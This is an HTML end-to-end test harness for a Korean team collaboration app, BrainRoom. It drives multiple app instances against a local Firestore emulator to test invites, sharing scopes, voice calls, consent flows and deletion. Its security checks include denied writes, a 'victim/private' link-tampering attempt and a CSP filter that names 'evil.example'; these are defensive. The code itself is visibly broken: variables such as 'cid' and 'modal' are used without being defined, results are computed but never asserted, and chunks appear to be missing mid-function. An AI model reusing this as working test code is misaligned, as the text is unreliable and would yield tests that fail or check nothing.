<!doctype html>
<html><head><meta charset="utf-8"><title>BrainRoom E2E</title></head>
<body>
<pre id="log">running…</pre>
<div id="frames"></div>
<script>
// 사람마다 iframe 하나 = 실제 앱 한 벌. 시험은 앱의 함수와 버튼을 그대로 쓰고, 결과는 관리자 REST로 DB에서 직접 확인한다.
window.USERS = {
  uA: { uid: 'uA', name: '안치성', email: 'a@x.com' },
  uB: { uid: 'uB', name: '김단유', email: 'b@x.com' },
  uC: { uid: 'uC', name: '박채연', email: 'c@x.com' },
  uP: { uid: 'uP', name: '교수님', email: 'p@x.com' },
  uX: { uid: 'uX', name: '낯선사람', email: 'x@x.com' },
};
const PROXY = new URLSearchParams(location.search).get('proxy');
const ONLY = new URLSearchParams(location.search).get('only');
const EMU = 'http://127.0.0.1:8181/v1/projects/demo-brainroom/databases/(default)/documents';
window.LOG = [];
const say = s => { LOG.push(s); document.getElementById('log').textContent = LOG.join('\n'); };
const ok = (c, m) => {
  say(`${c ? 'PASS' : 'FAIL'} ${m}`);
  if (c) return;
  // 실패하면 그 순간 각 앱의 오류를 함께 보여 준다
  Object.entries(frames).forEach(([u, f]) => { const errs = f.contentWindow?.__errors || []; const warns = f.contentWindow?.__warns || []; if (errs.length || warns.length) say(`     [${u}] ${errs.slice(-4).join(' | ').replace(/\s+/g, ' ').slice(0, 900)} // 경고: ${warns.slice(-3).join(' | ').replace(/\s+/g, ' ').slice(0, 400)}`); });
};
const sleep = ms => new Promise(r => setTimeout(r, ms));
async function until(fn, ms = 20000) {
  const t = Date.now();
  while (Date.now() - t < ms) {
    try { const v = await fn(); if (v) return v; } catch (e) { /* 아직 */ }
    await sleep(100);
  }
  return false;
}

// ---------- 관리자 REST (규칙 우회, 확인 전용) ----------
const admin = { Authorization: 'Bearer owner', 'Content-Type': 'application/json' };
const decode = v => {
  if ('stringValue' in v) return v.stringValue;
  if ('integerValue' in v) return Number(v.integerValue);
  if ('doubleValue' in v) return v.doubleValue;
  if ('booleanValue' in v) return v.booleanValue;
  if ('nullValue' in v) return null;
  if ('arrayValue' in v) return (v.arrayValue.values || []).map(decode);
  if ('mapValue' in v) return decodeFields(v.mapValue.fields || {});
  return v;
};
const decodeFields = f => Object.fromEntries(Object.entries(f).map(([k, v]) => [k, decode(v)]));
const encode = v => {
  if (v === null || v === undefined) return { nullValue: null };
  if (typeof v === 'string') return { stringValue: v };
  if (typeof v === 'boolean') return { booleanValue: v };
  if (typeof v === 'number') return { integerValue: String(v) };
  if (Array.isArray(v)) return { arrayValue: { values: v.map(encode) } };
  return { mapValue: { fields: Object.fromEntries(Object.entries(v).map(([k, x]) => [k, encode(x)])) } };
};
const getDoc = async p => {
  const r = await fetch(`${EMU}/${p}`, { headers: admin });
  if (r.status === 404) return null;
  if (!r.ok) throw new Error(`관리자 읽기 실패 ${r.status} ${p}`); // 일시 오류를 '문서 없음'으로 읽지 않는다
  return decodeFields((await r.json()).fields || {});
};
const setDoc = (p, d) => fetch(`${EMU}/${p}`, { method: 'PATCH', headers: admin, body: JSON.stringify({ fields: Object.fromEntries(Object.entries(d).map(([k, v]) => [k, encode(v)])) }) });
const delDoc = p => fetch(`${EMU}/${p}`, { method: 'DELETE', headers: admin });
const list = async p => {
  const r = await fetch(`${EMU}/${p}?pageSize=500`, { headers: admin });
  const j = r.ok ? await r.json() : {};
  return (j.documents || []).map(d => ({ id: d.name.split('/').pop(), ...decodeFields(d.fields || {}) }));
};
const collections = async p => {
  const r = await fetch(`${EMU}/${p}:listCollectionIds`, { method: 'POST', headers: admin, body: '{}' });
  return r.ok ? (await r.json()).collectionIds || [] : [];
};
const wipe = () => fetch('http://127.0.0.1:8181/emulator/v1/projects/demo-brainroom/databases/(default)/documents', { method: 'DELETE', headers: admin });

// ---------- 앱 한 벌 ----------
const frames = {};
// 앱의 동의 판을 그대로 읽어 '이미 동의한 사용자'를 만든다
let consentVersion = null;
async function giveConsent(u) {
  consentVersion ??= (await (await fetch('/js/legal.js')).text()).match(/CONSENT_VERSION = '([^']+)'/)[1];
  const fields = { consent: encode({ version: consentVersion, at: 1, over14: true, terms: true, privacy: true }) };
  await fetch(`${EMU}/users/${u}?updateMask.fieldPaths=consent`, { method: 'PATCH', headers: admin, body: JSON.stringify({ fields }) });
}
// 접근성 도구(axe-core)로 지금 화면을 검사한다
let axeSource = null;
async function axeCheck(w, where) {
  axeSource ??= await (await fetch('/e2e/axe.js')).text();
  if (!w.axe) w.eval(axeSource);
  const v = JSON.parse(await w.eval(`axe.run(document, { resultTypes: ['violations'] }).then(r => JSON.stringify(r.violations.map(v => ({ id: v.id, impact: v.impact, n: v.nodes.length, ex: v.nodes[0].target.join(' ').slice(0, 60), why: (v.nodes[0].any[0]?.message || '').slice(0, 100) }))))`));
  ok(!v.length, `접근성(axe): ${where}${v.length ? ` → ${v.map(x => `${x.id}×${x.n} ${x.ex} ${x.id === 'color-contrast' ? x.why : ''}`).join(' | ')}` : ''}`);
}

async function open(u, { proxy = false, consent = true, query = '' } = {}) {
  closeFrame(u);
  if (consent) await giveConsent(u);
  const f = document.createElement('iframe');
  f.allow = 'microphone; camera';
  f.style.cssText = 'width:1000px;height:700px';
  f.src = `/app.html?u=${u}${proxy ? `&proxy=${encodeURIComponent(PROXY)}` : ''}&t=${Date.now()}${query}`;
  document.getElementById('frames').appendChild(f);
  frames[u] = f;
  await new Promise(r => { f.onload = r; });
  const w = f.contentWindow;
  await until(() => w.eval('typeof authReady !== "undefined" && authReady && !cloud.busy'));
  return w;
}
function closeFrame(u) { if (frames[u]) { frames[u].remove(); delete frames[u]; } }
function closeAll() { Object.keys(frames).forEach(closeFrame); }

// 규칙에 막힌 쓰기가 있었는지 (앱이 console.error로 남긴 것)
function noDenied(w, who, allowed = []) {
  const bad = w.__errors.filter(e => /permission|PERMISSION|exception|rejection/.test(e) && !allowed.some(a => e.includes(a)));
  ok(!bad.length, `${who}: 앱 오류·규칙 거절 없음${bad.length ? ` → ${bad.slice(0, 3).join(' | ').replace(/\s+/g, ' ')}` : ''}`);
  w.__errors.length = 0;
}
const toastText = w => w.document.getElementById('toasts')?.textContent || '';

async function makeRoom(A, name = '호랑이양말') {
  await A.eval(`cloudCreateTeam(${JSON.stringify(name)}, ['안치성', '김단유'], '소공')`);
  await until(() => A.eval('cloud.loaded && state.meId'));
  return A.eval('cloud.teamId');
}
const invite = (w, kind) => w.eval(`teamRef().collection('secrets').doc('${kind}').get().then(s => location.origin + '/?team=' + cloud.teamId + '&code=' + s.data().code${kind === 'prof' ? " + '&as=prof'" : ''})`);
async function joinAs(w, link, memberName) {
  await w.eval(`joinFromInput(${JSON.stringify(link)})`);
  await until(() => w.eval('cloud.loaded'));
  await until(() => w.document.querySelector('[data-claim]'));
  const id = memberName ? w.eval(`state.members.find(m => m.name === ${JSON.stringify(memberName)}).id`) : 'new';
  w.document.querySelector(`[data-claim="${id}"]`).click();
  await until(() => w.eval('state.meId && cloud.roleDoc && cloud.roleDoc.memberId'));
  await sleep(300);
}

// ---------- 시나리오 1: 방 만들기 ~ 팀원 선점 ~ 공유 범위 ----------
async function scenarioRoom() {
  say('\n=== 방 만들기·참여·공유 범위');
  await wipe();
  const A = await open('uA'), B = await open('uB'), C = await open('uC'), P = await open('uP'), X = await open('uX');
  const T = await makeRoom(A);
  const team = await getDoc(`teams/${T}`);
  const mA = A.eval('state.meId');
  ok(team?.ownerUid === 'uA', '방 만들기: 팀 문서');
  ok((await getDoc(`teams/${T}/claims/${mA}`))?.uid === 'uA', '방 만들기: 내 팀원 칸을 선점');
  ok((await getDoc(`teams/${T}/members/uA`))?.name === '안치성' && !(await getDoc(`teams/${T}/members/uA`)).email, '방 만들기: 역할 문서에 이메일을 저장하지 않음');

  const link = await invite(A, 'student');
  await joinAs(B, link, '김단유');
  const mB = B.eval('state.meId');
  ok((await getDoc(`teams/${T}/claims/${mB}`))?.uid === 'uB', '초대 링크로 참여 → 빈자리 선점');
  await until(() => A.eval(`state.members.some(m => m.uid === 'uB')`));
  ok(A.eval(`state.members.find(m => m.uid === 'uB')?.name`) === '김단유', '다른 팀원 화면에 실시간 반영');
  ok((await getDoc(`teams/${T}/roster/${mB}`))?.uid === 'uB' && !(await getDoc(`teams/${T}`)).members?.length, '명단은 팀원별 문서에 저장');

  // C는 이미 B가 쓰는 칸을 가로챌 수 없다
  await C.eval(`joinFromInput(${JSON.stringify(link)})`);
  await until(() => C.eval('cloud.loaded'));
  const stolen = await C.eval(`cloudSetMemberId('${mB}')`);
  ok(stolen === false, '이미 쓰는 팀원 칸은 가로챌 수 없다');
  ok((await getDoc(`teams/${T}/claims/${mB}`))?.uid === 'uB', '가로채기 뒤에도 원래 주인 그대로');
  ok(toastText(C).includes('이미 다른 계정'), '가로채기 실패 안내');
  C.__errors.length = 0;
  await until(() => C.document.querySelector('[data-claim="new"]'));
  C.document.querySelector('[data-claim="new"]').click();
  await until(() => C.eval('cloud.roleDoc && cloud.roleDoc.memberId'));
  const mC = C.eval('state.meId');
  ok(mC && mC !== mB && (await getDoc(`teams/${T}/claims/${mC}`))?.uid === 'uC', '새 팀원으로 참여');

  // 틀린 코드
  const bad = await X.eval(`cloudJoin('${T}', 'wrong-code', 'student')`);
  ok(bad === null && toastText(X).includes('초대 링크'), '틀린 초대 코드 거절 + 안내');
  await until(async () => (await list(`teams/${T}/accessLogs`)).some(l => l.uid === 'uX'));
  ok((await list(`teams/${T}/accessLogs`)).some(l => l.uid === 'uX' && !l.email), '막힌 접근이 기록됨 (이메일 없이) (ONRQ-5)');
  ok((await list(`teams/${T}/roster`)).every(m => !m.email && !m.photo), '명단에 이메일·사진이 없음');
  X.__errors.length = 0;

  // 공유 범위별 기록 (앱 함수 그대로)
  A.eval(`addItem({ memberId: state.meId, type: 'memo', title: '나만 보는 메모', content: '비밀 내용', visibility: 'me' })`);
  A.eval(`addItem({ memberId: state.meId, type: 'idea', title: '다회용기 순환 서비스', content: '캠퍼스 반납함을 쓰기로 했다', visibility: 'team' })`);
  A.eval(`addItem({ memberId: state.meId, type: 'link', title: '회수율 통계', content: '교수자용 자료', url: 'https://example.com/a', visibility: 'prof' })`);
  await until(async () => (await list(`teams/${T}/items`)).length === 3);
  await until(() => B.eval(`state.items.filter(i => !i._stub).length === 2`));
  ok(B.eval(`state.items.filter(i => !i._stub).map(i => i.title).sort().join()`) === '다회용기 순환 서비스,회수율 통계', 'B: 팀·교수자 기록만 내용이 보임');
  ok(B.eval(`state.items.length`) === 3 && B.eval(`state.items.find(i => i._stub).title`) === '', 'B: 나만 기록은 횟수만');

  // 투표·결정·퀘스트·보정: 각자 앱 경로로
  const ideaId = B.eval(`state.items.find(i => i.type === 'idea').id`);
  B.eval(`itemById('${ideaId}').votes.push(state.meId); saveState()`);
  await until(async () => (await getDoc(`teams/${T}/items/${ideaId}`))?.votes?.length === 1);
  ok((await getDoc(`teams/${T}/items/${ideaId}`)).votes[0] === mB, '다른 팀원의 기록에 투표');
  B.eval(`addDecision({ text: '주제는 다회용기', sourceIds: ['${ideaId}'] })`);
  B.eval(`state.quests.push({ id: uid(), week: weekStart(), title: '자료 3개', target: 'any', count: 3, done: false }); saveState()`);
  await until(async () => (await list(`teams/${T}/decisions`)).length === 1 && (await list(`teams/${T}/quests`)).length === 1);
  ok((await list(`teams/${T}/decisions`)).length === 1, '결정 저장');
  // 빠진 기여 보정: B가 요청 → C가 확인
  B.eval(`state.corrections.push({ id: 'corr1', memberId: state.meId, requesterUid: authUser.uid, kind: 'missing', note: '빠짐', status: 'pending', createdAt: Date.now(), title: '설문 작성', type: 'memo', url: '' }); saveState()`);
  await until(() => C.eval(`state.corrections.some(c => c.id === 'corr1')`));
  C.eval(`applyCorrection(state.corrections.find(c => c.id === 'corr1'), state.meId)`);
  await until(async () => (await getDoc(`teams/${T}/corrections/corr1`))?.status === 'applied');
  const corr = await getDoc(`teams/${T}/corrections/corr1`);
  ok(corr?.confirmedBy === mC, '보정 요청 확인 (확인자 = 나)');
  await until(async () => (await list(`teams/${T}/items`)).some(i => i.correctionId === 'corr1'));
  const added = (await list(`teams/${T}/items`)).find(i => i.correctionId === 'corr1');
  ok(added?.memberId === mB && added?.ownerUid === 'uB', '보정으로 빠진 기여가 요청자 이름으로 추가');
  await until(async () => (await list(`teams/${T}/logs`)).length === 1);
  await sleep(500); // 이력이 두 번 쓰이지 않는지도 본다
  ok((await list(`teams/${T}/logs`)).length === 1, '변경 이력 저장 (한 번만)');

  // 분류 보정: B가 요청 → C가 확인 (기록·횟수 기록·요청이 모두 규칙을 통과해야 한다)
  const memoId = B.eval(`addItem({ memberId: state.meId, type: 'memo', title: '분류 보정 시험', content: '내용', visibility: 'team' }).id`);
  await until(async () => (await getDoc(`teams/${T}/itemMeta/${memoId}`)));
  B.eval(`state.corrections.push({ id: 'corr2', memberId: state.meId, requesterUid: authUser.uid, kind: 'reclass', note: '', status: 'pending', createdAt: Date.now(), itemId: '${memoId}', type: 'idea' }); saveState()`);
  await until(() => C.eval(`state.corrections.some(c => c.id === 'corr2') && itemById('${memoId}') && !itemById('${memoId}')._stub`));
  C.eval(`applyCorrection(state.corrections.find(c => c.id === 'corr2'), state.meId)`);
  await until(async () => (await getDoc(`teams/${T}/corrections/corr2`))?.status === 'applied' && (await getDoc(`teams/${T}/itemMeta/${memoId}`))?.type === 'idea');
  ok((await getDoc(`teams/${T}/items/${memoId}`))?.type === 'idea' && (await getDoc(`teams/${T}/itemMeta/${memoId}`))?.type === 'idea', '분류 보정이 기록과 횟수 기록에 모두 반영');
  // 내 칸만: 앱이 보내는 명단 쓰기가 규칙을 통과한다
  const denied0 = await B.eval(`teamRef().update({ links: { github: 'victim/private' } }).then(() => 'ok').catch(e => e.code)`);
  ok(denied0 === 'permission-denied', '팀원은 연동 대상을 못 바꿈');
  B.__errors.length = 0;
  ok(B.eval('canEditLinks()') === false && A.eval('canEditLinks()') === true, '연동 대상 수정 권한 표시');

  // 교수자
  const profLink = await invite(A, 'prof');
  await P.eval(`joinFromInput(${JSON.stringify(profLink)})`);
  await until(() => P.eval('cloud.profTeams && cloud.profTeams.length === 1'));
  const pv = JSON.parse(P.eval(`JSON.stringify(cloud.profTeams[0])`));
  ok(pv.items.length === 5, '교수자: 기록 횟수는 모두 집계');
  await until(async () => (await list(`teams/${T}/itemMeta`)).length === (await list(`teams/${T}/items`)).length);
  ok((await list(`teams/${T}/itemMeta`)).length === (await list(`teams/${T}/items`)).length, '기록과 횟수 기록이 항상 짝을 이룸');
  ok(pv.items.filter(i => i.title).map(i => i.title).join() === '회수율 통계', '교수자: 내용은 교수자까지 기록만');
  ok(pv.members.every(m => !m.email && !m.uid), '교수자 보기에 이메일·계정 없음');

  // 방 이동: 회의실의 문, 전체 보기 카드, 상단 메뉴
  A.eval(`go('meeting')`);
  await until(() => A.document.querySelector(`#app [data-go="room"][data-member="${mB}"]`));
  A.document.querySelector(`#app [data-go="room"][data-member="${mB}"]`).dispatchEvent(new A.MouseEvent('click', { bubbles: true }));
  await until(() => A.eval(`state.view === 'room' && state.roomId === '${mB}'`), 3000);
  ok(A.eval(`state.view === 'room' && state.roomId === '${mB}'`) && A.document.querySelector('#app .room, #app svg'), '회의실의 문을 눌러 팀원 방으로 이동');
  A.eval(`go('office')`);
  await until(() => A.document.querySelector(`.room-card[data-member="${mC}"]`));
  A.document.querySelector(`.room-card[data-member="${mC}"]`).click();
  await until(() => A.eval(`state.view === 'room' && state.roomId === '${mC}'`), 3000);
  ok(A.eval(`state.roomId === '${mC}'`), '전체 보기 카드로 이동');
  A.document.querySelector('#nav [data-go="room"]').click();
  await until(() => A.eval(`state.view === 'room' && (state.roomId === state.meId || !state.roomId)`), 3000);
  ok(A.eval(`state.view === 'room' && (state.roomId === state.meId || !state.roomId)`), '상단 메뉴로 내 방 이동');
  // 온라인 갱신이 오는 중에도 방이 유지된다
  B.eval(`addItem({ memberId: state.meId, type: 'memo', title: '방 이동 중 갱신', content: '내용', visibility: 'team' })`);
  await until(() => A.eval(`state.items.some(i => i.title === '방 이동 중 갱신')`));
  ok(A.eval(`state.view === 'room'`), '다른 팀원이 기록을 남겨도 보던 방이 유지됨');

  // 주간 요약: 이번 주 기록이 팀에게, 걸러서 교수자에게
  B.eval(`weeklyFrom = weekStart(); go('report')`);
  await until(() => B.document.querySelector('.weekly-card'));
  const wkB = B.document.querySelector('.weekly-card').textContent;
  ok(/기록 \d+건/.test(wkB) && wkB.includes('주제는 다회용기') && wkB.includes('이번 주'), '주간 요약: 기록·확정한 결정이 팀에게 보임');
  ok(!wkB.includes('비밀 내용') && !wkB.includes('나만 보는 메모'), '주간 요약: 다른 사람의 나만 기록 내용은 없음');
  A.eval(`weeklyFrom = weekStart(); go('report')`);
  await until(() => A.document.querySelector('.weekly-card'));
  ok(!A.document.querySelector('.weekly-card').textContent.includes('나만 보는 메모'), '주간 요약: 내 화면에도 내 나만 기록 제목은 안 나옴');
  B.document.querySelector('[data-tr="week-prev"]').click();
  await until(() => B.document.querySelector('.weekly-card')?.textContent.includes('지난주'));
  ok(B.document.querySelector('.weekly-card').textContent.includes('지난주') && B.document.querySelector('.weekly-card').textContent.includes('남은 기록이 없어요'), '주간 요약: 이전 주로 이동');
  B.document.querySelector('[data-tr="week-next"]').click();
  await until(() => B.document.querySelector('.weekly-card')?.textContent.includes('이번 주'));

  const tabbables = [...modal.querySelectorAll('button:not([disabled]), input:not([disabled]), select, textarea, a[href], summary')].filter(x => x.offsetParent !== null);

  A.document.dispatchEvent(new A.KeyboardEvent('keydown', { key: 'Escape', bubbles: true }));

  for (const v of ['meeting', 'room', 'office', 'timeline', 'decisions', 'report', 'calls', 'integrations']) {
    A.eval(`go('${v}')`); B.eval(`go('${v}')`);
    await sleep(120);
  }
  A.eval(`openMenu()`); await sleep(100); A.eval(`closeModal()`);
  await until(() => A.eval(`state.online && state.online.has(state.meId) && state.online.has('${mB}') && state.online.has('${mC}')`));
  ok(A.eval(`state.online.has('${mB}') && state.online.has('${mC}')`), '접속 중 표시: 방금 참여한 팀원도 2분을 기다리지 않음 (RQ-8)');
  noDenied(A, 'A'); noDenied(B, 'B'); noDenied(C, 'C'); noDenied(P, '교수자');
  // 실제 CSP 아래에서 정상 기능이 막히지 않았는지
  for (const [w, who] of [[A, 'A'], [B, 'B'], [P, '교수자']]) {
    const v = w.__csp.filter(x => !x.includes('evil.example'));
    ok(!v.length, `${who}: CSP에 걸린 정상 요청 없음${v.length ? ` → ${v.slice(0, 3).join(' | ')}` : ''}`);
  }
  return { A, B, C, P, X, T, mA, mB, mC };
}

// ---------- 시나리오 2: 회의 (실제 WebRTC + 규칙) ----------
async function scenarioCalls({ A, B, C, T, mA, mB }) {

  await until(() => B.eval(`liveCalls().some(c => c.id === '${cid}')`));
  await B.eval(`joinCall('${cid}', { cam: false, stt: false })`);
  const connected = await until(() => A.eval(`call.pcs.get('uB')?.pc.connectionState === 'connected'`) && B.eval(`call.pcs.get('uA')?.pc.connectionState === 'connected'`), 20000);
  ok(connected, '두 브라우저 음성 연결 성공 (Firestore 신호 + 실제 규칙)');
  await until(() => A.eval(`Boolean(call.pcs.get('uB')?.stream)`), 5000);
  ok(A.eval(`call.pcs.get('uB')?.stream?.getAudioTracks().length`) === 1, '상대 소리 트랙 도착');
  A.eval(`saveLine('다회용기 순환 서비스를 주제로 하기로 했어요')`);
  B.eval(`saveLine('설문은 제가 만들고 예산도 정리할게요')`);
  B.eval(`saveLine('제 전화번호는 010-1234-5678 입니다')`);
  await until(async () => (await list(`teams/${T}/calls/${cid}/lines`)).length === 3);
  const ln = await list(`teams/${T}/calls/${cid}/lines`);
  ok(ln.length === 3 && ln.every(l => !l.text.includes('010-1234')), '녹취 저장 + 개인정보 가림 (LS-4)');
  // B 나가고 A 나감 → 마지막 사람이 끝냄
  await B.eval('leaveCall()');
  await until(() => A.eval(`call.peers.size === 0`), 8000);
  await A.eval('leaveCall()');
  await until(async () => (await getDoc(`teams/${T}/calls/${cid}`))?.summary);
  const ended = await getDoc(`teams/${T}/calls/${cid}`);

  // 각자 방의 '내가 한 말'
  await B.eval('syncMyTalks()'); await A.eval('syncMyTalks()');
  await until(async () => (await list(`teams/${T}/items`)).filter(i => i.type === 'talk').length === 2);
  const talks = (await list(`teams/${T}/items`)).filter(i => i.type === 'talk');
  const talkB = talks.find(t => t.memberId === mB);
  ok(talkB?.ownerUid === 'uB' && talkB.content.includes('설문') && !talkB.content.includes('다회용기 순환'), "B의 방: B가 한 말만 요약");
  await until(() => B.eval(`state.items.some(i => i.type === 'talk' && i.memberId === '${mA}')`));
  const cand = JSON.parse(B.eval(`JSON.stringify(decisionCandidates().map(c => c.text))`));

  ok(new Set(cand).size === cand.length, '같은 말이 후보에 두 번 나오지 않음');

  // 동시에 끝내기: 요약은 한 번

  await until(() => A.eval('call.id'));
  const c2 = A.eval('call.id');
  await until(() => B.eval(`liveCalls().some(c => c.id === '${c2}')`));
  const results = await Promise.all([A.eval(`endCall('${c2}')`), B.eval(`endCall('${c2}')`), C.eval(`endCall('${c2}')`)]);
  await until(async () => (await getDoc(`teams/${T}/calls/${c2}`))?.summaryBy);
  const c2doc = await getDoc(`teams/${T}/calls/${c2}`);

  // 버려진 회의: 브라우저가 꺼져 '진행 중'으로 남은 회의를 다른 팀원이 정리
  const old = Date.now() - 10 * 60 * 1000;
  await setDoc(`teams/${T}/calls/ghost`, { id: 'ghost', title: '꺼진 회의', status: 'live', startedBy: 'uC', startedByName: '박채연', startedAt: old, endedAt: null, summary: null });
  await setDoc(`teams/${T}/calls/ghost/peers/uC`, { uid: 'uC', name: '박채연', joinedAt: old, beat: old, leftAt: null });
  await setDoc(`teams/${T}/calls/ghost/lines/l1`, { uid: 'uC', memberId: 'x', name: '박채연', text: '발표는 다음 주에 하기로 했어요', at: old });
  await setDoc(`teams/${T}/calls/alive`, { id: 'alive', title: '진행 중인 회의', status: 'live', startedBy: 'uC', startedByName: '박채연', startedAt: old, endedAt: null, summary: null });
  await setDoc(`teams/${T}/calls/alive/peers/uC`, { uid: 'uC', name: '박채연', joinedAt: old, beat: Date.now(), leftAt: null });
  await setDoc(`teams/${T}/calls/nosum`, { id: 'nosum', title: '요약 못 한 회의', status: 'ended', startedBy: 'uC', startedByName: '박채연', startedAt: old, endedAt: old, summary: null });
  await until(() => A.eval(`state.calls.some(c => c.id === 'ghost') && state.calls.some(c => c.id === 'alive') && state.calls.some(c => c.id === 'nosum')`));
  await A.eval('sweepCalls()');
  await until(async () => (await getDoc(`teams/${T}/calls/ghost`))?.summary);
  const g = await getDoc(`teams/${T}/calls/ghost`);
  ok(g.status === 'ended' && g.summary.includes('발표') && g.closedBy === 'uA', '아무도 없는 회의를 팀원이 대신 끝내고 요약');
  ok((await getDoc(`teams/${T}/calls/alive`)).status === 'live', '사람이 있는 회의는 건드리지 않음');

  await delDoc(`teams/${T}/calls/alive/peers/uC`); await delDoc(`teams/${T}/calls/alive`);

  A.eval('render()');

  B.eval(`go('calls')`); await sleep(200);
  ok(!B.document.querySelector(`[data-mt="erase:${cid.replace(/"/g, '')}"]`) || B.eval(`state.calls.find(c => c.id === '${cid}').startedBy`) === 'uB', '시작자·팀장이 아니면 지우기 버튼 없음');
  const denied = await B.eval(`eraseCallDocs(callsRef().doc('${cid}')).then(() => 'ok').catch(e => e.code)`);

  await until(() => A.document.querySelector(`[data-mt="erase:${cid}"]`));
  A.document.querySelector(`[data-mt="erase:${cid}"]`).click();
  await until(async () => !(await getDoc(`teams/${T}/calls/${cid}`)));

  await until(() => C.eval('cloud.teamId === null'));

  const prof = await B.eval(`teamRef().collection('secrets').doc('prof').get().then(s => Boolean(s.data().code))`);
  ok(prof, '새 팀장이 교수자 링크를 읽음');

  // 내 기록까지 지우고 나가기 (LS-5). 지우는 도중 '내가 한 말' 자동 생성이 돌아도 되살아나지 않아야 한다
  const before = (await list(`teams/${T}/items`)).filter(i => i.ownerUid === 'uA').length;
  A.localStorage.removeItem('brainroom:talks-done');
  A.eval('scheduleTalkSync()');
  await A.eval(`cloudLeaveTeam(true)`);
  await until(() => A.eval('cloud.teamId === null'));
  const after = await list(`teams/${T}/items`);
  ok(before > 0 && !after.some(i => i.ownerUid === 'uA'), `내 기록 ${before}개를 지우고 나감`);
  await sleep(3000); // 예약돼 있던 자동 생성 시각이 지나도
  ok(!(await list(`teams/${T}/items`)).some(i => i.ownerUid === 'uA'), '나간 뒤에 내 기록이 되살아나지 않음');
  ok(!(await list(`teams/${T}/itemMeta`)).some(i => i.ownerUid === 'uA'), '횟수 기록도 함께 지움');
  ok(!(await getDoc(`teams/${T}/members/uA`)) && !(await getDoc('users/uA'))?.teams?.[T], '역할·방 목록 정리');
  noDenied(A, 'A');

  // 방 삭제 (B: 새 팀장, C는 접속 중)
  const name = B.eval('state.teamName');
  B.eval(`openManageModal()`);
  await until(() => B.document.querySelector('[data-cloud="delete"]'));
  B.__promptAnswer = '다른 이름';
  B.document.querySelector('[data-cloud="delete"]').click();
  await sleep(500);
  ok(await getDoc(`teams/${T}`), '방 이름이 다르면 삭제 안 함');
  await until(() => B.document.querySelector('[data-cloud="delete"]'));
  B.__promptAnswer = name;
  B.document.querySelector('[data-cloud="delete"]').click();
  await until(async () => !(await getDoc(`teams/${T}`)), 20000);
  ok(!(await getDoc(`teams/${T}`)), '방 삭제');
  const left = await collections(`teams/${T}`);
  const remain = [];
  for (const c of left) remain.push(...(await list(`teams/${T}/${c}`)).map(d => `${c}/${d.id}`));
  ok(remain.length === 0, `하위 문서가 남지 않음${remain.length ? ` → ${remain.slice(0, 5).join(', ')}` : ''}`);
  await until(() => C.eval('cloud.teamId === null'));
  ok(C.eval('cloud.teamId === null'), '접속 중이던 팀원의 방도 닫힘');
  await until(async () => !(await getDoc('users/uC'))?.teams?.[T]);
  ok(!(await getDoc('users/uC'))?.teams?.[T], '팀원의 방 목록에서도 정리');
  await until(() => !B.eval('cloud.teamId'));
  ok(B.eval(`cloud.showSetup`), '삭제한 사람은 방 선택 화면으로');
  noDenied(B, 'B', ['Missing or insufficient']);
  C.__errors.length = 0;
}

// ---------- 동의·나이 확인·보호자 동의 ----------
async function scenarioConsent() {
  say('\n=== 동의·나이 확인·보호자 동의');
  closeAll();
  await wipe();
  const Kid = await open('uC', { consent: false }), Adult = await open('uX', { consent: false });
  await until(() => Adult.document.getElementById('consentForm'));
  const form = Adult.document.getElementById('consentForm');
  ok(Boolean(form), '동의 전에는 동의 화면이 먼저 나옴');
  ok(![...form.querySelectorAll('input')].some(i => i.checked), '동의·나이 항목이 미리 선택돼 있지 않음');
  ok([...form.querySelectorAll('a')].some(a => a.getAttribute('href') === 'legal/privacy.html') && [...form.querySelectorAll('a')].some(a => a.getAttribute('href') === 'legal/terms.html'), '방침·약관 링크');
  ok(form.querySelector('#logoutBtn') && !form.querySelector('#logoutBtn').classList.contains('primary'), '거절 버튼이 숨겨져 있지 않음');
  await axeCheck(Adult, '동의 화면');
  const denied = await Adult.eval(`db.collection('teams').doc().set({ teamName: 'x', ownerUid: authUser.uid, members: [] }).then(() => 'ok').catch(e => e.code)`);
  ok(denied === 'permission-denied', '동의 전에는 방을 만들 수 없음 (앱을 건너뛰어도)');
  Adult.__errors.length = 0;
  ok(!form.checkValidity(), '필수 항목 없이는 제출되지 않음');
  form.querySelector('[value="14plus"]').checked = true;
  form.querySelector('[name="terms"]').checked = true;
  ok(!form.checkValidity(), '개인정보 동의가 빠지면 제출되지 않음');
  form.querySelector('[name="privacy"]').checked = true;
  form.requestSubmit();
  await until(() => Adult.eval('consentOk() && !cloud.busy'));
  ok((await getDoc('users/uX'))?.consent?.over14 === true && (await getDoc('users/uX')).consent.at > 0, '동의 기록 저장 (시각·판)');
  ok(!Adult.document.getElementById('consentForm'), '동의하면 시작 화면으로');

  // 만 14세 미만
  const kf = Kid.document.getElementById('consentForm');
  kf.querySelector('[value="under14"]').checked = true;
  kf.querySelector('[name="terms"]').checked = true;
  kf.querySelector('[name="privacy"]').checked = true;
  kf.requestSubmit();
  await until(() => Kid.document.getElementById('guardianLink'));
  const link = Kid.document.getElementById('guardianLink')?.value || '';
  ok(link.includes('guardian='), '만 14세 미만: 보호자 링크가 나옴');
  await axeCheck(Kid, '보호자 대기 화면');
  const u = await getDoc('users/uC');
  ok(u.consent.over14 === false && !JSON.stringify(u).includes('birth'), '생년월일 없이 나이 구간만 저장');
  const kidDenied = await Kid.eval(`db.collection('teams').doc().set({ teamName: 'x', ownerUid: authUser.uid, members: [] }).then(() => 'ok').catch(e => e.code)`);
  ok(kidDenied === 'permission-denied', '보호자 동의 전에는 방을 만들 수 없음');
  const flip = await Kid.eval(`userRef().update({ 'consent.over14': true }).then(() => 'ok').catch(e => e.code)`);
  ok(flip === 'permission-denied', '혼자 만 14세 이상으로 바꿀 수 없음');
  Kid.__errors.length = 0;
  const token = new URL(link).searchParams.get('guardian');
  // 아이가 직접 링크를 열면
  const Self = await open('uC', { consent: false, query: `&guardian=${token}` });
  await until(() => Self.document.body.textContent.includes('보호자가 열어야'));
  ok(Self.document.body.textContent.includes('보호자가 열어야'), '아이 본인 계정으로는 승인 화면이 안 나옴');
  closeFrame('uC');
  // 보호자
  const G = await open('uP', { consent: false, query: `&guardian=${token}` });
  await until(() => G.document.getElementById('guardianForm'));
  const gf = G.document.getElementById('guardianForm');
  ok(Boolean(gf) && !gf.querySelector('[name="attest"]').checked, '보호자 화면: 확인 항목이 미리 선택돼 있지 않음');
  await axeCheck(G, '보호자 동의 화면');
  ok(!gf.checkValidity(), '법정대리인 확인 없이는 동의되지 않음');
  gf.querySelector('[name="attest"]').checked = true;
  gf.requestSubmit();
  await until(async () => (await getDoc(`guardianRequests/${token}`))?.status === 'approved');
  const req = await getDoc(`guardianRequests/${token}`);
